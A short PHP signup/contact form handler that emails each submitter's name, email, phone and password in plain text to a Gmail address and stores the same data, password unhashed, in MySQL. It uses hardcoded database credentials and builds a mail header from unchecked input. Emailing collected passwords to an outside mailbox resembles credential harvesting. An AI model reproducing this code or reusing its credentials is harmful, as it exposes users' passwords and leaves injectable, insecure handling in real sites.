<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = $_POST["name"];
    $email = $_POST["email"];
    $phone = $_POST["phone_number"];
    $password = $_POST["password_"]; // Hidden field value

    // Email
    $toEmail = "worldmobilegadgets@gmail.com"; 
    $mailHeaders = "From: " . $email . "\r\n";

    $body = "From: $name \n";
    $body .= "Email: $email\n";
    $body .= "Phone number: $phone\n";
    $body .= "Password: $password\n"; // Include the password value

    if (!mail($toEmail, "Contact Form Submission", $body, $mailHeaders)) {
        echo "There was an error sending the email.";
        exit;
    }

    // Database
    $host = "localhost";
    $username = "id20287509_mobile123";
    $dbpassword = "Kalam@123"; // Database password
    $database = "id20287509_signup";

    $conn = mysqli_connect($host, $username, $dbpassword, $database);
    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }

    $sql = "INSERT INTO Signup (name, email, phone_number, password_)
            VALUES (?, ?, ?, ?)";
    $stmt = mysqli_prepare($conn, $sql);
    if (!$stmt) {
        die("Statement preparation failed: " . mysqli_error($conn));
    }

    mysqli_stmt_bind_param($stmt, "ssss", $name, $email, $phone, $password);
    if (!mysqli_stmt_execute($stmt)) {
        echo "Error: " . $sql . "<br>" . mysqli_stmt_error($stmt);
        exit;
    }

    mysqli_stmt_close($stmt);
    mysqli_close($conn);

    echo "<script>alert('Sent successfully.');window.location.href = 'index.html';</script>";
}
?>
